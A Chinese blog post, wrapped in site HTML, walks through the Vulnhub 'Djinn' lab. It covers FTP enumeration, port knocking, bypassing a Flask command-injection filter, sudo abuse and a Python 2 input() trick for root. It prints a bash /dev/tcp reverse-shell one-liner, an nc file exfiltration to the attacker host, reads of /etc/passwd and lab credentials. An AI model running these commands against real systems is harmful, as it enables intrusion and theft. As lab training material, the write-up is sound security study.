@@ -1,0 +1,1294 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>Vulnhub靶场做题记录-Djiin | 欢迎来访</title>
+  <meta name="description" content="安装靶机,nmap扫描发现7331端口是http服务,22端口ssh服务被过滤了,21端口允许匿名登陆, 21&#x2F;tcp  open ftp   vsftpd 3.0.3  | ftp-anon: Anonymous FTP login allowed (FTP code 230)  | -rw-r--r--  1 0    0       11 Oct 20 23:54 creds.txt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub靶场做题记录-Djiin">
+<meta property="og:url" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/index.html">
+<meta property="og:site_name" content="欢迎来访哦!">
+<meta property="og:description" content="安装靶机,nmap扫描发现7331端口是http服务,22端口ssh服务被过滤了,21端口允许匿名登陆, 21&#x2F;tcp  open ftp   vsftpd 3.0.3  | ftp-anon: Anonymous FTP login allowed (FTP code 230)  | -rw-r--r--  1 0    0       11 Oct 20 23:54 creds.txt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/1.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/2.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/3.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/4.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/5.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/6.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/7.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/8.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/9.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/10.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/11.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/12.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/13.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/14.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/15.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/16.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/17.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/18.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/19.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/20.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/21.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/22.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/23.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/24.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/25.png">
+<meta property="og:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/26.png">
+<meta property="article:published_time" content="2020-06-30T13:23:31.000Z">
+<meta property="article:modified_time" content="2020-06-30T14:03:42.627Z">
+<meta property="article:author" content="1eng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="欢迎来访哦!" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body class="main-center theme-blue" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/1eng" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">1eng</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Information Security &amp; Student</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> 江西, 中国</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/1eng" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/markwhile1" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Elevation/">Elevation</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTB%E9%9D%B6%E6%9C%BA/">HTB靶机</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Vulnhub%E9%9D%B6%E5%9C%BA/">Vulnhub靶场</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Webshell/">Webshell</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Webshell/">Webshell</a>
+              </p>
+              <p class="item-title">
+                <a href="/Webshell/1/" class="title">Webshell总结(一)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-06-30T14:49:02.000Z" itemprop="datePublished">2020-06-30</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Vulnhub%E9%9D%B6%E5%9C%BA/">Vulnhub靶场</a>
+              </p>
+              <p class="item-title">
+                <a href="/Vulnhub%E9%9D%B6%E5%9C%BA/12/" class="title">Vulnhub靶场做题记录-Reconforce-01</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-06-30T14:26:13.000Z" itemprop="datePublished">2020-06-30</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Vulnhub%E9%9D%B6%E5%9C%BA/">Vulnhub靶场</a>
+              </p>
+              <p class="item-title">
+                <a href="/Vulnhub%E9%9D%B6%E5%9C%BA/11/" class="title">Vulnhub靶场做题记录-haclabs-no_name</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-06-30T14:05:31.000Z" itemprop="datePublished">2020-06-30</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Vulnhub%E9%9D%B6%E5%9C%BA/">Vulnhub靶场</a>
+              </p>
+              <p class="item-title">
+                <a href="/Vulnhub%E9%9D%B6%E5%9C%BA/10/" class="title">Vulnhub靶场做题记录-Djiin</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-06-30T13:23:31.000Z" itemprop="datePublished">2020-06-30</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Vulnhub%E9%9D%B6%E5%9C%BA/">Vulnhub靶场</a>
+              </p>
+              <p class="item-title">
+                <a href="/Vulnhub%E9%9D%B6%E5%9C%BA/9/" class="title">Vulnhub靶场做题记录-Connect-the-dots</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-06-30T13:17:40.000Z" itemprop="datePublished">2020-06-30</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-vulnhub10" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Vulnhub靶场做题记录-Djiin
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/Vulnhub%E9%9D%B6%E5%9C%BA/10/" class="article-date">
+	  <time datetime="2020-06-30T13:23:31.000Z" itemprop="datePublished">2020-06-30</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/Vulnhub%E9%9D%B6%E5%9C%BA/">Vulnhub靶场</a>
+  </span>
+
+        
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/Vulnhub%E9%9D%B6%E5%9C%BA/10/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 2.5k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 12(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p>  安装靶机,nmap扫描发现7331端口是http服务,22端口ssh服务被过滤了,21端口允许匿名登陆,</p>
+<pre><code>21/tcp  open ftp   vsftpd 3.0.3
+
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+| -rw-r--r--  1 0    0       11 Oct 20 23:54 creds.txt
+
+| -rw-r--r--  1 0    0       128 Oct 21 00:23 game.txt
+
+|_-rw-r--r--  1 0    0       113 Oct 21 00:23 message.txt</code></pre><p>1337端口信息提示:</p>
+<p>Let’s see how good you are with simple maths  Answer my questions 1000 times and I’ll give you your gift</p>
+<p> 意思是让我们回答1000个问题就给一个大的礼物</p>
+<p> 用 nc 发起 请求 nc 192.168.245.12 发现是一个计算器,让我们回答1000次数学问题</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/1.png" alt></p>
+<p> 用python解决即可:</p>
+<pre><code>#coding: utf-8
+
+import telnetlib
+
+import time,re
+
+
+
+def main():
+
+  try:
+
+​    tn = telnetlib.Telnet(&#39;192.168.245.12&#39;,port=1337)
+
+  except:
+
+​    print(&#39;error&#39;)
+
+  time.sleep(0.5)
+
+  loop = 1
+
+  while loop &lt; 1002:
+
+​    data = tn.read_very_eager().decode(&#39;ascii&#39;)
+
+​    res = re.search(&#39;(.*?)\s&gt;&#39;,data).group(1)
+
+​    result = str(calc(res))
+
+​    print(str(loop) + &#39; &#39; + result)
+
+​    loop = loop + 1
+
+​    tn.write(result.encode(&#39;ascii&#39;)+b&#39;\n&#39;)
+
+​    time.sleep(0.1)
+
+  data = tn.read_very_eager().decode(&#39;ascii&#39;)
+
+  return data
+
+
+
+
+
+def calc(res):
+
+  \#(4, &#39;-&#39;, 6)
+
+  res_str = res.strip(&#39;(&#39;).replace(&#39; &#39;,&#39;&#39;).strip(&#39;)&#39;)
+
+  nums = res_str.split(&#39;,&#39;)
+
+  n1 = nums[0].strip()
+
+  operator = nums[1].strip().replace(&#39;\&#39;&#39;,&#39;&#39;)
+
+  n2 = nums[2].strip()
+
+  return eval(n1+operator+n2)
+
+
+
+print(main())
+
+</code></pre><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/2.png" alt></p>
+<p>等了几分钟后礼物出来了</p>
+<p>Here is your gift, I hope you know what to do with it:</p>
+<p>1356, 6784, 3409</p>
+<p> ssh的22端口是可以隐藏在其它端口的,称之为暗语,如果要将端口打开,就要用knock工具打开暗语,然后22端口才能开启</p>
+<p> 下载knockd工具</p>
+<p> 尝试将得到的端口打开 knock 192.168.245.12 1356, 6784, 3409</p>
+<p>  这里试了好多遍,期间重新搭建靶机,才将22端口开启</p>
+<p> 接下来下载可以匿名登陆的ftp中的文件</p>
+<p>  登陆后使用help命令:</p>
+  <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/3.png">
+
+<p> 可以使用mget 或 reget下载文件  将这三个文件下载到本地:</p>
+<p> creds.txt  -&gt; nitu:81299  可能是账号密码</p>
+<p> game.txt -&gt; </p>
+<p>oh and I forgot to tell you I’ve setup a game for you on port 1337. See if you can reach to the </p>
+<p>final level and get the prize.</p>
+<p> 这个提示1337端口又信息, 这里1337的端口已经获取到信息了</p>
+<p> message.txt  -&gt;@nitish81299 I am going on holidays for few days, please take care of all the work. And don’t mess up anything.</p>
+<p> @nitish81299 可能是账号或密码 记录下来</p>
+<p> 下面看7331端口获取信息:</p>
+<p> gobuster 扫目录得到 /wish 目录</p>
+<p> 访问后发现是一个命令执行 过滤了一些字符</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/4.png" alt></p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/5.png" alt></p>
+<p>解码后 name=uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
+<p>使用burp进行fuzz看过滤那些字符</p>
+<p> 先发送到Repeater 分析一下:</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/6.png" alt></p>
+<p> 有个302重定向 那么跑包时应设置要跑重定向</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/7.png" alt></p>
+<p> 选择字典</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/8.png" alt></p>
+<p>因为kali中burp是社区版 不能设置线程的所以有点慢</p>
+<p>可以看到 有几个符号是被过滤了的:</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/9.png" alt></p>
+<p> 尝试反弹shell </p>
+<p><em>bash -i &gt;&amp; /dev/tcp/192.168.245.6/9001 0&gt;&amp;1</em>  在kali对它进行一个url编码</p>
+<p><em>bash+-i+&gt;%26+/dev/tcp/192.168.245.6/9001+0&gt;%261</em></p>
+<p> 但是含有 /  符号 是不能反弹成功的</p>
+<p> 这里用到了linux中利用  | 符号 进行多条命令执行 的知识</p>
+<p> <em>cat /etc/passwd</em>  在burp中对它进行一个base64编码, 再本地执行命令 </p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/10.png" alt></p>
+<p>可以看到成功执行命令 那么bash -i &gt;&amp; /dev/tcp/192.168.245.6/9001 0&gt;&amp;1也是同样可以执行的</p>
+<p> 成功反弹shell:</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/11.png" alt></p>
+<p> 同样切换到python shell  切换到后台 但是同样的root用户权限和命令 不知道为什么我的不能放到后台</p>
+<p>目录下有个app.py:</p>
+<pre><code>import subprocess
+
+from flask import Flask, redirect, render_template, request, url_for
+
+app = Flask(__name__)
+
+app.secret_key = &quot;key&quot;
+
+CREDS = &quot;/home/nitish/.dev/creds.txt&quot;
+
+RCE = [&quot;/&quot;, &quot;.&quot;, &quot;?&quot;, &quot;*&quot;, &quot;^&quot;, &quot;$&quot;, &quot;eval&quot;, &quot;;&quot;]
+
+def validate(cmd):
+
+  if CREDS in cmd and &quot;cat&quot; not in cmd:
+
+​    return True
+
+  try:
+
+​    for i in RCE:
+
+​      for j in cmd:
+
+​        if i == j:
+
+​          return False
+
+​    return True
+
+  except Exception:
+
+​    return False
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
+
+def index():
+
+  return render_template(&quot;main.html&quot;)
+
+@app.route(&quot;/wish&quot;, methods=[&#39;POST&#39;, &quot;GET&quot;])
+
+def wish():
+
+  execute = request.form.get(&quot;cmd&quot;)
+
+  if execute:
+
+​    if validate(execute):
+
+​      output = subprocess.Popen(execute, shell=True,
+
+​                   stdout=subprocess.PIPE).stdout.read()
+
+​    else:
+
+​      output = &quot;Wrong choice of words&quot;
+
+
+
+​    return redirect(url_for(&quot;genie&quot;, name=output))
+
+  else:
+
+​    return render_template(&#39;wish.html&#39;)
+
+@app.route(&#39;/genie&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+
+def genie():
+
+  if &#39;name&#39; in request.args:
+
+​    page = request.args.get(&#39;name&#39;)
+
+  else:
+
+​    page = &quot;It&#39;s not that hard&quot;
+
+  return render_template(&#39;genie.html&#39;, file=page)
+
+if __name__ == &quot;__main__&quot;:
+
+  app.run(host=&#39;0.0.0.0&#39;, debug=True)</code></pre><p> 分析: 可以看到用了python中的Flask模板程序 </p>
+<pre><code> if CREDS in cmd and &quot;cat&quot; not in cmd:
+
+​    return True
+
+
+ execute = request.form.get(&quot;cmd&quot;)
+
+  if execute:
+
+​    if validate(execute):
+
+​      output = subprocess.Popen(execute, shell=True,
+
+​                   stdout=subprocess.PIPE).stdout.read()</code></pre><p> 比如这个代码 是可以绕过的 more /home/nitish/.dev/creds.txt 这样的话 cat 不在里面也就返回True 然后执行此条命令</p>
+<pre><code> try:
+
+​    for i in RCE:
+
+​      for j in cmd:
+
+​        if i == j:
+
+​          return False
+
+​    return True</code></pre><p>而这个代码就是过滤字符 RCE = [“/“, “.”, “?”, “*”, “^”, “$”, “eval”, “;”]</p>
+<p>所以可以burp抓包拿到 /home/nitish/.dev/creds.txt 或者 直接 <em>cat /home/nitish/.dev/creds.txt</em></p>
+<p> 内容: nitish:p4ssw0rdStr3r0n9  应该是账号密码 登陆ssh成功</p>
+<p> 登陆后目录下有一个user.txt 拿到第一个flag:10aay8289ptgguy1pvfa73alzusyyx3c</p>
+<p> 接下来想办法提权:</p>
+<p> sudo -l 查看可执行的程序:</p>
+<p> (sam) NOPASSWD: /usr/bin/genie </p>
+<p> 发现sam用户可以不用密码执行 /usr/bin/genie </p>
+<p> ls -al /usr/bin/genie 再查看 程序权限 -rwsr-x— 1 sam nitish 72000 Nov 11 19:09 /usr/bin/genie</p>
+<p> 发现sam用户是可以执行这个程序的</p>
+<p> 再查看genie程序参数:</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/12.png" alt></p>
+<p> 说可以执行程序或命令 但是没有用</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/13.png" alt></p>
+<p> 看是否用手册可以查看</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/14.png" alt></p>
+<p> 可以看到隐藏了 -cmd 参数 可以执行命令</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/15.png" alt></p>
+<p>前面了解到sam用户可以不用密码执行 /usr/bin/genie  于是用sudo -u指定sam用户执行程序</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/16.png" alt></p>
+<p>发现用户变了</p>
+<p> sudo -l 查看可执行程序 </p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/17.png" alt></p>
+<p> root用户不用密码就可以执行/root/lago 程序</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/18.png" alt></p>
+<p>但是不能得到有用的信息</p>
+<p>用strings 工具 查看程序 也没有权限</p>
+<p> 这时切换到sam用户目录 有这些文件:</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/19.png" alt></p>
+<p> .pyc是关键文件</p>
+<p> 但是要反编译才能得到.py 文件</p>
+<p> 用nc工具下载到本地 或 base64 转码复制到本地 都行的,只不过base64转码可能太多符号不好弄 这边的话用nc</p>
+<p> 本地监听端口 <em>nc -lp 9002 &gt; 1.pyc</em></p>
+<p> 靶机发送连接 <em>nc 192.168.245.6 9002 &lt;.pyc</em></p>
+<p> 用工具uncompyle6 反编译 .pyc</p>
+<p> <em>pip3 install uncompyle6</em>  先安装工具</p>
+<p> 编译后得到如下代码:</p>
+<pre><code>from getpass import getuser
+
+from os import system
+
+from random import randint
+
+def naughtyboi():
+
+  print &#39;Working on it!! &#39;
+
+def guessit():
+
+  num = randint(1, 101)
+
+  print &#39;Choose a number between 1 to 100: &#39;
+
+  s = input(&#39;Enter your number: &#39;)
+
+  if s == num:
+
+​    system(&#39;/bin/sh&#39;)
+
+  else:
+
+​    print &#39;Better Luck next time&#39;
+
+def readfiles():
+
+  user = getuser()
+
+  path = input(&#39;Enter the full of the file to read: &#39;)
+
+  print &#39;User %s is not allowed to read %s&#39; % (user, path)
+
+def options():
+
+  print &#39;What do you want to do ?&#39;
+
+  print &#39;1 - Be naughty&#39;
+
+  print &#39;2 - Guess the number&#39;
+
+  print &#39;3 - Read some damn files&#39;
+
+  print &#39;4 - Work&#39;
+
+  choice = int(input(&#39;Enter your choice: &#39;))
+
+  return choice
+
+def main(op):
+
+  if op == 1:
+
+​    naughtyboi()
+
+  else:
+
+​    if op == 2:
+
+​      guessit()
+
+​    else:
+
+​      if op == 3:
+
+​        readfiles()
+
+​      else:
+
+​        if op == 4:
+
+​          print &#39;work your ass off!!&#39;
+
+​        else:
+
+​          print &#39;Do something better with your life&#39;
+
+
+
+
+
+if __name__ == &#39;__main__&#39;:
+
+  main(options())
+
+# okay decompiling 1.pyc
+
+#File &#39;-o&#39; doesn&#39;t exist. Skipped
+
+#File &#39;1.py&#39; doesn&#39;t exist. Skipped
+
+# 
+
+# Successfully decompiled file</code></pre><p> 代码正好对应 root/lago 程序的执行结果 很简单,漏洞点出现再弱类型比较:</p>
+<pre><code>def guessit():
+
+  num = randint(1, 101)
+
+  print &#39;Choose a number between 1 to 100: &#39;
+
+  s = input(&#39;Enter your number: &#39;)
+
+  if s == num:
+
+​    system(&#39;/bin/sh&#39;)
+
+  else:
+
+​    print &#39;Better Luck next time&#39;</code></pre><p> if s == num:  用的是双等号,没有比较字符类型. 输入 num 即可绕过</p>
+<p> 然后拿到root权限 第二个flag:</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/20.png" alt></p>
+<p>Flag:33eur2wjdmq80z47nyy4fx54bnlg3ibc</p>
+<p>同时查看下它的lago程序：</p>
+<pre><code>#!/usr/bin/python2
+
+from getpass import getuser
+
+from os import system
+
+from os.path import isfile
+
+from random import randint
+
+def naughtyboi():
+
+ # TODO: Get some sexy news, if you know what I mean ;-)
+
+
+
+  print(&quot;Working on it!! &quot;)
+
+def check(path):
+
+  try:
+
+​    if isfile(path):
+
+​      return True
+
+​    else: 
+
+​      return False
+
+  except Exception: 
+
+​    return False
+
+def guessit():
+
+  num = randint(1, 101)
+
+  print(&quot;Choose a number between 1 to 100: &quot;)
+
+  try:
+
+​    s = input(&quot;Enter your number: &quot;)
+
+​    if s == num:
+
+​      system(&quot;/bin/sh&quot;)
+
+​    else:
+
+​      print(&quot;Better Luck next time&quot;)
+
+  except:
+
+​    print(&quot;Slow claps again&quot;)
+
+
+def readfiles():
+
+  user = getuser()
+
+  try:
+
+​    path = raw_input(&quot;Enter the full of the file to read: &quot;)
+
+
+
+​    if check(path):
+
+
+
+​      print(&quot;User %s is not allowed to read %s&quot; % (user, path))
+
+
+
+​    else:
+
+
+
+​      print(&quot;Slow clap for this hacker right here&quot;)
+
+
+
+  except Exception:
+
+
+
+​    print(&quot;Slow clap for this hacker right here&quot;)
+
+
+def options():
+
+
+
+  print(&quot;What do you want to do ?&quot;)
+
+
+
+  print(&quot;1 - Be naughty&quot;)
+
+
+
+  print(&quot;2 - Guess the number&quot;)
+
+
+
+  print(&quot;3 - Read some damn files&quot;)
+
+
+
+  print(&quot;4 - Work&quot;)
+
+
+  try:
+
+
+
+​    choice = input(&quot;Enter your choice:&quot;)
+
+
+
+  except Exception:
+
+
+
+​    print(&quot;\n&quot;)
+
+  try:
+
+​    choice = int(choice)
+
+​    return choice
+
+  except Exception:
+
+​    print(&quot;Man Stop hacking the damn input menu&quot;)
+
+def main(op):
+
+  if op == 1:
+
+​    naughtyboi()
+
+  elif op == 2:
+
+​    guessit()
+
+  elif op == 3:
+
+​    readfiles()
+
+  elif op == 4:
+
+​    print(&quot;work your ass off!!&quot;)
+
+  else:
+
+​    print(&quot;Do something better with your life&quot;)
+
